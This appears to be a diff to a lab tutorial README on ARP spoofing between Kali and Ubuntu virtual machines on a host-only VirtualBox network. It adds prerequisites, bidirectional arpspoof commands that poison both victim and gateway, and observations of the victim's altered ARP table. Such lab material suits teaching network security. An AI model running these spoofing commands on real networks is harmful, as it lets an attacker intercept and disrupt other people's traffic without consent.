@@ -37,6 +37,13 @@ This allows the attacker to:
 
 ---
 
+## 📋 Prerequisites
+- Basic Linux command-line knowledge
+- Oracle VirtualBox installed
+- Kali Linux Virtual Machine
+- Ubuntu Linux Virtual Machine
+- Host-Only Adapter configured in VirtualBox
+
 ## 🛠 Tools Used
 - `arpspoof` (dsniff package)
 - `ip` command
@@ -62,5 +69,21 @@ sudo sysctl -w net.ipv4.ip_forward=1
 ```
 ### Step 4: Perform ARP Spoofing
 ```bash
+# Spoof victim
 sudo arpspoof -i eth0 -t 192.168.56.4 192.168.56.1
+# Spoof gateway
+sudo arpspoof -i eth0 -t 192.168.56.1 192.168.56.4
+
 ```
+
+## 🔍 Verification & Observations
+
+After starting the ARP spoofing attack, the following changes were observed on the victim machine:
+
+- The ARP table shows incorrect MAC address mappings
+- Network traffic is redirected through the attacker
+- Victim experiences intermittent connectivity issues
+
+### Command Used on Victim (Ubuntu):
+```bash
+arp -a
